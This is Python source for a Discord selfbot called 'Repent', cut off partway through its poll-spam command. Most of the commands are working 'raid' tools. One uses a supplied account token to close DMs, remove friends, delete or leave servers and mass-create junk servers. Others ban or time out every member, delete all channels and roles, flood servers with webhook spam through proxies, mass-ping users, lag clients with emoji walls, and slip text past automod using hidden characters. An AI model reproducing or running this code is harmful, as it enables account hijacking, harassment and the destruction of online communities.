@Repent.command(description=f"Displays all help panels. \nUsage: {config_get('prefix')}help [panel name/command name] [panel number]", help = "utility")
async def help(ctx, category="None", num=None):
    heading = ""
    body = ""
    cmdname = ""
    comment = ""
    categories = get_command_categories()
    if category == "None" and num is None:
        heading = "Help"
        body = format_catagories(categories)
        cmdname = "help"
        comment = f"Use {config_get('prefix')}help command-name for help on commands!"
        await panelmaker(ctx, heading, body, cmdname, comment)
        return
    isitacmd, description = is_cmd(category)
    if isitacmd:
        heading = category.lower()
        if description == "":
            body = "This command has no description."
        body = description
        cmdname = category.lower()
        comment = "< > Is Required᲼|᲼[ ] Is Optional"
        await panelmaker(ctx, heading, body, cmdname, comment)
        return
    if category.lower() in categories:
        if num:
            commands, max_panels = get_commands(category.lower(), int(num))
            if int(num) < max_panels:
                comment = f"Use {config_get('prefix')}help {category} {int(num)+1} for more"
            else:
                comment = None
        else: 
            commands, max_panels = get_commands(category.lower())
            if 1 < max_panels:
                num = 1
                comment = f"Use {config_get('prefix')}help {category} {int(num)+1} for more"
        if not commands:
            heading = "Error"
            body = "The help panel you are looking for does not exist."
            cmdname = "ERROR"
            await panelmaker(ctx, heading, body, cmdname, comment)
            return
        heading = category.lower()
        body = format_commands(commands)
        cmdname = category.lower()
        await panelmaker(ctx, heading, body, cmdname, comment)
        return
    else:
        heading = "Error"
        body = "The help panel you are looking for does not exist."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname, comment)
        return

@Repent.command(description=f"Uses the search function to find commands matching the given word. \nUsage: {config_get('prefix')}search <query>", help = "utility")
async def search(ctx, word):
    matching_commands = []

    for command in Repent.commands:
        if word in command.name:
            matching_commands.append(command.name)

    if matching_commands:
        commands_list = "\n".join(matching_commands)
        heading = f"Commands containing '{word}'"
        body = f"{commands_list}\n"
        cmdname = "Search"
        await panelmaker(ctx, heading, body, cmdname)
    else:
        heading = "ERROR"
        body = f"No commands found containing '{word}'."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Pings a user then deletes the message to hide it. \nUsage: {config_get('prefix')}ghostping <@user/role>", help="raid")
async def ghostping(ctx, user):
    pass

@Repent.command(description=f"Rapes a token by changing a bunch of settings making a bunch of servers etc. \nUsage: {config_get('prefix')}tokenfuck <token>", help="raid")
async def tokenfuck(ctx, token):
    valid = tokenvalid(token)
    if valid:
        pass
    else:
        heading = "Error"
        body = "Token submitted was invalid."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)
        return

    headers = {'Authorization': f'{token}', 'x-super-properties': getxsuper()}
    
    async def close_dms(headers):
        r = json.loads((await arequesters.get('https://discord.com/api/v9/users/@me/channels', headers=headers)).text)
        for channel in r:
            (await arequesters.delete(f"https://discord.com/api/v9/channels/{channel['id']}?silent=true", headers=headers))
    
    async def make_servers():
        while True:
            try:
                characters = string.ascii_letters + string.digits + string.punctuation
                name = ''.join(random.choice(characters) for _ in range(100))
                payload = {
                        "name": name
                        }
                headers = {
                'Authorization': config_get('token'),
                'x-super-properties': getxsuper(),
                }
                (await arequesters.post("https://discord.com/api/v9/guilds", headers=headers, json_data=payload))
            except:
                return

    async def servers(headers):
        servers = (await arequesters.get("https://discord.com/api/v9/users/@me/guilds", headers=headers))
        data = servers.json()
        ids = [entry["id"] for entry in data]
        for id in ids:
            try:
                (await arequesters.delete(f"https://discord.com/api/v9/users/@me/guilds/{id}",headers=headers))
            except:
                (await arequesters.delete(f"https://discord.com/api/v9/guilds/{id}/delete", headers=headers))

    async def remove_friends(headers):
        ids = set()
        parsed_data = []
        r = (await arequesters.get("https://discord.com/api/v9/users/@me/relationships", headers=headers))
        data = r.json()  
        for item in data:  
            if 'id' in item:
                id_ = item['id']
                if id_ not in ids:
                    ids.add(id_)
                    parsed_data.append(item)
        for item in parsed_data:  
            id_ = item['id']
            (await arequesters.delete(f"https://discord.com/api/v9/users/@me/relationships/{id_}", headers=headers))

    tasks_close_remove = asyncio.gather(close_dms(headers), remove_friends(headers))
    task_servers = asyncio.create_task(servers(headers))
    await task_servers
    asyncio.create_task(make_servers())
    await tasks_close_remove

@Repent.command(description=f"Invisibly pings someone. \nUsage: {config_get('prefix')}invisping <@user> [message]", help="raid")
async def invisping(ctx, User: discord.User, *, msg = None):
    if msg == None:
        msg = "** **"
    userping=User.mention
    msg == msg or ""
    await ctx.send(f"‏‏‎{msg}||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||‎‎||‎||‎‎||‎‎||‎‎||‎‎||||||||||||||||||||||{userping}")

@Repent.command(description=f"Spams threads in a channel. \nUsage: {config_get('prefix')}threadspam [number of threads]", help="raid") 
async def threadspam(ctx, Amount=10):   
    global stopper
    token = config_get('token')
    headers = {'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7', 'Content-Type': 'application/json', 'Authorization': token}
    message_ = {
        'auto_archive_duration': 1440,
        'location': 'Slash Command',
        'name': "Thread",
        'type': 11
        }
    try:
        if stopper == True:
            return
        for i in range(int(Amount)):
            (await arequesters.post(f'https://discord.com/api/v9/channels/{ctx.channel.id}/threads', headers=headers, json_data=message_))
            time.sleep(1)
    except Exception as e:
        print(f'{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}There was an error with threadspam: {e}')
        asyncio.run(await send_webhook("Thread Spam Error", f"There was an error with threadspam: {str(e)}. Please check the logs for more details.", config_get('error_webhook_url')))

@Repent.command(description=f"Bans everyone from a server. \nUsage: {config_get('prefix')}massban", help="raid")
async def massban(ctx):
    users = await scrapeid(ctx.guild.id, ctx.guild.member_count)
    headers = {"Authorization": config_get('token'), "X-Super-Properties": getxsuper(), "X-Audit-Log-Reason": "Repent"}
    json = {"delete_message_seconds": 0}
    for user in users:
        try:
            req = (await arequesters.put(f"https://discordapp.com/api/v9/guilds/{ctx.guild.id}/bans/{user}", headers=headers, json_data=json))
            if req.status_code == 204:
                pass
            elif req.status_code == 429:
                    retry_after = req.json().get('retry_after', 1)
                    await asyncio.sleep(retry_after)
                    req = (await arequesters.put(f"https://discordapp.com/api/v9/guilds/{ctx.guild.id}/bans/{user}", headers=headers, json_data=json))
                    if req.status_code == 204:
                        pass
            elif req.status_code == 403:
                pass
            else:
                print(req.status_code)
                print(req.text)
                break
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.WHITE}{e}")
            break

@Repent.command(description=f"Unbans everyone from a server. \nUsage: {config_get('prefix')}unbanall", help="raid")
async def unbanall(ctx):
    if ctx.author.guild_permissions.ban_members:
        banned_users = await ctx.guild.bans() 
        for ban_entry in banned_users:
            user = ban_entry.user
            await ctx.guild.unban(user, reason="Repent")
            time.sleep(0.25)
        heading = "Unban All"
        body = "All users have been unbanned."
        cmdname = "unbanall"
        await panelmaker(ctx, heading, body, cmdname)
    else:
        heading = "ERROR"
        body = "You don't have the necessary permissions to use this command."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)

stop_signals = {}

def read_proxies_from_file(filename):
    proxy_list = []
    try:
        with open(filename, "r") as file:
            for line in file:
                if line != "Format: http://USER:PASS@HOST:PORT":
                    proxy_list.append(line.strip())
    except FileNotFoundError:
        return None
    return proxy_list

@Repent.command(description=f"Spams a server with channels and webhooks. \nUsage: {config_get('prefix')}hookraid [message] [number of channels] [delay]", help="raid")
async def hookraid(ctx, message: str=None, channel_amount: int=None, delay: int=0):
    global stop_signals
    if message is None:
        message = "@everyone"
    if channel_amount is None:
        channel_amount = 10
    author_name = str(ctx.author.name).lower()
    avatar = str(Repent.user.avatar)
    if (await arequesters.get(avatar)).status_code != 200:
        avatar = "https://assets.idlesys.xyz/assets/a85b73af23fd5bf1cf2f7cb63333874a548d366e538f55f87c9139da2db93dba.jpg"
    webhook_tasks = []

    async def send_with_proxy(webhook, message, stop_signal, proxy_url):
        connector = ProxyConnector.from_url(proxy_url, verify_ssl=False)

        async with aiohttp.ClientSession(connector=connector) as session:
            while not stop_signal.is_set():
                try:
                    await session.post(
                        webhook.url,
                        json={"content": message},
                        headers={"Content-Type": "application/json"}
                    )
                    await asyncio.sleep(delay)
                except Exception as e:
                    print(f"Error sending message via proxy {proxy_url}: {e}")

    async def send_without_proxy(webhook, message, stop_signal):
        async with aiohttp.ClientSession() as session:
            while not stop_signal.is_set():
                try:
                    await session.post(
                        webhook.url,
                        json={"content": message, "tts": True},
                        headers={"Content-Type": "application/json"}
                    )
                    await asyncio.sleep(delay)
                except Exception as e:
                    print(f"Error sending message without proxy: {e}")

    async def send(webhook, message, stop_signal, proxy_list):
        if proxy_list:
            tasks = [send_with_proxy(webhook, message, stop_signal, proxy_url) for proxy_url in proxy_list]
            await asyncio.gather(*tasks)
        else:
            await send_without_proxy(webhook, message, stop_signal)

    async def avbytes():
        async with aiohttp.ClientSession() as session:
            async with session.get(avatar) as response:
                return await response.read()

    async def create_channel_webhook(i):
        channel_name = author_name
        channel = await ctx.guild.create_text_channel(name=channel_name)
        webhook = await channel.create_webhook(name=author_name, avatar=await avbytes())
        stop_signal = asyncio.Event()
        stop_signals[channel.id] = stop_signal
        proxy_list = read_proxies_from_file(PROXIES_FILE)
        webhook_task = asyncio.create_task(send(webhook, message, stop_signal, proxy_list))
        webhook_tasks.append(webhook_task)

    creation_tasks = [create_channel_webhook(i) for i in range(channel_amount)]
    await asyncio.gather(*creation_tasks)

    while not all(task.done() for task in webhook_tasks):
        done, _ = await asyncio.wait(webhook_tasks, return_when=asyncio.FIRST_COMPLETED)
        webhook_tasks = list(done)

@Repent.command(description=f"Stops the hookraid loop. \nUsage: {config_get('prefix')}stophookraid", help="raid")
async def stophookraid(ctx):
    for channel in ctx.guild.channels:
        if isinstance(channel, discord.TextChannel) and channel.name.lower() == str(ctx.author.name).lower():
            webhooks = await channel.webhooks()
            for webhook in webhooks:
                if webhook.name == str(ctx.author.name).lower():
                    stop_signal = stop_signals.get(channel.id)
                    if stop_signal:
                        stop_signal.set()
                    else:
                        pass
    stop_signals.clear()

@Repent.command(description=f"Leaves all servers you are currently in. \nUsage: {config_get('prefix')}leaveservers", help="raid")
async def leaveservers(ctx):
    for guild in Repent.guilds:
        try:
            await guild.leave()
        except:
            print("Cannot leave server")

@Repent.command(description=f"Mass timeouts people in a server. \nUsage: {config_get('prefix')}masstimeout", help="raid")
async def masstimeout(ctx):
    token = config_get('token')
    s=datetime.now().date()
    modified_date = s + timedelta(days=6)
    future = datetime.strftime(modified_date, "%Y-%m-%d")
    resoolt = future
    users = await scrape(ctx.guild.id, ctx.guild.member_count)
    for user in users:
        headers = {'x-super-properties': getxsuper(), 'authorization': token, "Content-Type": "application/json"}
        data = '{"communication_disabled_until":"'+resoolt+'T23:59:59.999Z"}'
        response = requested.patch(f'https://discordapp.com/api/v9/guilds/{ctx.guild.id}/members/{user.id}', headers=headers, data=data)
        if response.status_code == 403:
            print(f'{Fore.LIGHTRED_EX}Failed To Timeout {user.name} In {ctx.guild.name}')
            pass
        elif response.status_code == 200:
            pass

@Repent.command(description=f"Spams a message. \nUsage: {config_get('prefix')}spam [times to spam] <message>", help="raid")
async def spam(ctx, amount: int=10, *, message):
    global stopper
    for _i in range(amount):
        if stopper == True:
            return
        await ctx.send(message)
        await asyncio.sleep(1)

@Repent.command(description=f"Deletes all channels in a Discord server. \nUsage: {config_get('prefix')}delchannels", help="raid")
async def delchannels(ctx):
    async def delete_channel(channel):
        try:
            await asyncio.sleep(random.uniform(1, 3))
            await channel.delete()
        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[Error]: {Fore.WHITE}{e}")
            await send_webhook("Delete Channels Error", f"Failed to delete a channel due to: {str(e)}.", config_get('error_webhook_url'))
    delete_tasks = [delete_channel(channel) for channel in ctx.guild.channels]
    await asyncio.gather(*delete_tasks)

@Repent.command(description=f"Mass creates channels. \nUsage: {config_get('prefix')}masschannel [channel name] [number of channels]", help="raid")
async def masschannel(ctx, *, name="Repent", channelnum=None):
    if channelnum is None:
        channelnum = 10
    async def create_channel(_):
        try:
            await ctx.guild.create_text_channel(name=name)
        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[Error]: {Fore.WHITE}{e}")
            await send_webhook("Mass Channel Creation Error", f"Failed to create a channel due to: {str(e)}.", config_get('error_webhook_url'))
            await asyncio.sleep(0.5)
            await create_channel(_)

    creation_tasks = [create_channel(_) for _ in range(channelnum)]
    await asyncio.gather(*creation_tasks)

@Repent.command(description=f"Sends a wall of blank text. \nUsage: {config_get('prefix')}wall", help="raid")
async def wall(ctx):
    await ctx.send("**" + "\n" * 1996 + "**")

@Repent.command(description=f"Sends a message in every channel. \nUsage: {config_get('prefix')}sendall <message>", help="raid")
async def sendall(ctx, *, message):
    try:
        channels = ctx.guild.text_channels
        for channel in channels:
            await channel.send(message)
    except:
        pass

@Repent.command(description=f"Mass pings people. \nUsage: {config_get('prefix')}massmention [times to massmention] [delay]", help="raid")
async def massmention(ctx, amount=10, delay=1):
    ids = await scrapeid(ctx.guild.id, ctx.guild.member_count)
    pos = 0
    for i in range(amount):
        message = ""
        while True:
            mention_id = ids[pos]
            if mention_id != Repent.user.id:
                mention = f"<@{mention_id}>"
                if len(message) + len(mention) > 2000:
                    await ctx.send(message)
                    await asyncio.sleep(delay)
                    message = ""
                message += mention
            pos = (pos + 1) % len(ids)
            if pos == 0:
                break
        if message: 
            await ctx.send(message)
            await asyncio.sleep(delay)

@Repent.command(description=f"Renames every channel. \nUsage: {config_get('prefix')}renamechannels <name>", help="raid")
async def renamechannels(ctx, *, name):
    async def rename_channel(channel):
        try:
            await asyncio.sleep(random.uniform(2, 3))
            await channel.edit(name=name)
        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[Error]: {Fore.WHITE}{e}")
            await send_webhook("Rename Channels Error", f"Failed to rename a channel due to: {str(e)}.", config_get('error_webhook_url'))
    rename_tasks = [rename_channel(channel) for channel in ctx.guild.channels]
    await asyncio.gather(*rename_tasks)

@Repent.command(description=f"Changes everyone's nickname. \nUsage: {config_get('prefix')}nickall <nickname>", help="raid")
async def nickall(ctx, nickname):
    users = await scrape(ctx.guild.id, ctx.guild.member_count)
    for member in users:
        try:
            print(member.name)
            await member.edit(nick=nickname)
        except Exception as e:
            print(e)

@Repent.command(description=f"Spams reactions on messages. \nUsage: {config_get('prefix')}reactspam <emoji> [number of reactions]", help="raid")
async def reactionspam(ctx, emoji, messages: int=10):
    global stopper
    async def add_reaction_task(msg):
        if stopper == True:
            return
        await msg.add_reaction(emoji)
    tasks = [add_reaction_task(msg) async for msg in ctx.channel.history(limit=messages)]
    await asyncio.gather(*tasks)

@Repent.command(description=f"Spams emojis to lag discord clients. \nUsage: {config_get('prefix')}emojispam [times to spam]", help="raid")
async def emojispam(ctx, num=2):
    global stopper
    for i in range(int(num)):
        if stopper == True:
            return
        await ctx.send(""":chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains:""")
        time.sleep(1.75)
        await ctx.send(""":flag_white::flag_black::checkered_flag::triangular_flag_on_post::rainbow_flag::transgender_flag::pirate_flag::flag_af::flag_ax::flag_al::flag_dz::flag_as::flag_ao::flag_ad::flag_ai::flag_aq::flag_ag::flag_ar::flag_bb::flag_bd::flag_bh::flag_bs::flag_az::flag_at::flag_au::flag_aw::flag_am::flag_by::flag_be::flag_bz::flag_bj::flag_bm::flag_bt::flag_ba::flag_bo::flag_bw::flag_cm::flag_kh::flag_bi::flag_bf::flag_bg::flag_bn::flag_vg::flag_io::flag_br::flag_ca::flag_ic::flag_cv::flag_bq::flag_ky::flag_cf::flag_td::flag_cl::flag_cn::flag_ci::flag_cr::flag_ck::flag_cd::flag_cg::flag_km::flag_co::flag_cc::flag_cx::flag_hr::flag_cu::flag_cw::flag_cy::flag_cz::flag_dj::flag_dk::flag_dm::flag_do::flag_fk::flag_eu::flag_et::flag_ee::flag_er::flag_gq::flag_sv::flag_eg::flag_ec::flag_fo::flag_fj::flag_fi::flag_fr::flag_gf::flag_pf::flag_tf::flag_ga::flag_gm::flag_gu::flag_gp::flag_gl::flag_gd::flag_gr::flag_gi::flag_gh::flag_de::flag_ge::flag_gt::flag_gg::flag_gn::flag_gw::flag_gy::flag_ht::flag_hn::flag_hk::flag_hu::flag_it::flag_il::flag_ie:""")
        time.sleep(1.75)
        await ctx.send(""":chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains:""")
        time.sleep(1.75)
        await ctx.send(""":flag_white::flag_black::checkered_flag::triangular_flag_on_post::rainbow_flag::transgender_flag::pirate_flag::flag_af::flag_ax::flag_al::flag_dz::flag_as::flag_ao::flag_ad::flag_ai::flag_aq::flag_ag::flag_ar::flag_bb::flag_bd::flag_bh::flag_bs::flag_az::flag_at::flag_au::flag_aw::flag_am::flag_by::flag_be::flag_bz::flag_bj::flag_bm::flag_bt::flag_ba::flag_bo::flag_bw::flag_cm::flag_kh::flag_bi::flag_bf::flag_bg::flag_bn::flag_vg::flag_io::flag_br::flag_ca::flag_ic::flag_cv::flag_bq::flag_ky::flag_cf::flag_td::flag_cl::flag_cn::flag_ci::flag_cr::flag_ck::flag_cd::flag_cg::flag_km::flag_co::flag_cc::flag_cx::flag_hr::flag_cu::flag_cw::flag_cy::flag_cz::flag_dj::flag_dk::flag_dm::flag_do::flag_fk::flag_eu::flag_et::flag_ee::flag_er::flag_gq::flag_sv::flag_eg::flag_ec::flag_fo::flag_fj::flag_fi::flag_fr::flag_gf::flag_pf::flag_tf::flag_ga::flag_gm::flag_gu::flag_gp::flag_gl::flag_gd::flag_gr::flag_gi::flag_gh::flag_de::flag_ge::flag_gt::flag_gg::flag_gn::flag_gw::flag_gy::flag_ht::flag_hn::flag_hk::flag_hu::flag_it::flag_il::flag_ie:""")
        time.sleep(1.75)
        await ctx.send(""":chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains:""")
        time.sleep(1.75)
        await ctx.send(""":flag_white::flag_black::checkered_flag::triangular_flag_on_post::rainbow_flag::transgender_flag::pirate_flag::flag_af::flag_ax::flag_al::flag_dz::flag_as::flag_ao::flag_ad::flag_ai::flag_aq::flag_ag::flag_ar::flag_bb::flag_bd::flag_bh::flag_bs::flag_az::flag_at::flag_au::flag_aw::flag_am::flag_by::flag_be::flag_bz::flag_bj::flag_bm::flag_bt::flag_ba::flag_bo::flag_bw::flag_cm::flag_kh::flag_bi::flag_bf::flag_bg::flag_bn::flag_vg::flag_io::flag_br::flag_ca::flag_ic::flag_cv::flag_bq::flag_ky::flag_cf::flag_td::flag_cl::flag_cn::flag_ci::flag_cr::flag_ck::flag_cd::flag_cg::flag_km::flag_co::flag_cc::flag_cx::flag_hr::flag_cu::flag_cw::flag_cy::flag_cz::flag_dj::flag_dk::flag_dm::flag_do::flag_fk::flag_eu::flag_et::flag_ee::flag_er::flag_gq::flag_sv::flag_eg::flag_ec::flag_fo::flag_fj::flag_fi::flag_fr::flag_gf::flag_pf::flag_tf::flag_ga::flag_gm::flag_gu::flag_gp::flag_gl::flag_gd::flag_gr::flag_gi::flag_gh::flag_de::flag_ge::flag_gt::flag_gg::flag_gn::flag_gw::flag_gy::flag_ht::flag_hn::flag_hk::flag_hu::flag_it::flag_il::flag_ie:""")
        time.sleep(1.75)

@Repent.command(description=f"Bypass automod with given message. \nUsage: {config_get('prefix')}bypass <word to bypass> [server id] [channel id]", help="raid")
async def bypass(ctx, word: str, server_id: int=None, channel_id: int=None):
    if server_id is None:
        server_id = ctx.guild.id
    if channel_id is None:
        channel_id = ctx.channel.id
    parts = word.split('<')
    bypassed_parts = []
    for part in parts:
        if '>' in part:
            subparts = part.split('>')
            bypassed_subparts = [subparts[0]]
            for subpart in subparts[1:]:
                bypassed_subparts.append('⁥' + subpart)
            bypassed_parts.append('>'.join(bypassed_subparts))
        else:
            bypassed_parts.append(''.join([letter + '⁥' for letter in part]))
    bypassed_word = '<'.join(bypassed_parts)
    original_channel = ctx.channel
    server = Repent.get_guild(server_id)
    if server:
        channel = server.get_channel(channel_id)
        if channel:
            await channel.send(bypassed_word)
            await original_channel.send("**Bypassed word sent!**")
        else:
            await ctx.send(bypassed_word)
    else:
        await ctx.send(bypassed_word)

@Repent.command(description=f"Deletes every role in a server. \nUsage: {config_get('prefix')}delroles", help="raid")
async def delroles(ctx):
    roles = ctx.guild.roles
    for role in roles:
        try:
            await role.delete()
        except discord.HTTPException as role_error:
            if role_error.status == 400 and role_error.code == 50028:
                pass
            else:
                print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}Error deleting role {role.name}: {role_error}")
                await send_webhook("Role Deletion Error", f"Error deleting role {role.name}: {str(role_error)}. Please check the logs for more details.", config_get('error_webhook_url'))

@Repent.command(description=f"Spams a server full of roles. \nUsage: {config_get('prefix')}spamroles [role name] [amount of roles]", help="raid")
async def spamroles(ctx, name: str="Repent",amount: int=10):
    global stopper
    async def makerole(name):
        if stopper == True:
            return
        await ctx.guild.create_role(name=name)
    await asyncio.gather(*(asyncio.create_task(makerole(name)) for i in range(amount)))

@Repent.command(description=f"Spams polls containing large amounts of junk text. \nUsage: {config_get('prefix')}pollraid [number of polls to spam]", help="raid")
async def pollraid(ctx, times=10):
    global stopper
    url = f"https://discord.com/api/v9/channels/{ctx.channel.id}/messages"
    headers = {
        "authorization": config_get('token'),
        "x-super-properties": getxsuper()
        }
    json_data = {
        "content": "",
        "tts": False,
        "poll": {
            "question": {"text": "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"},
            "duration": 168,
            "layout_type": 1,
            "allow_multiselect": True,
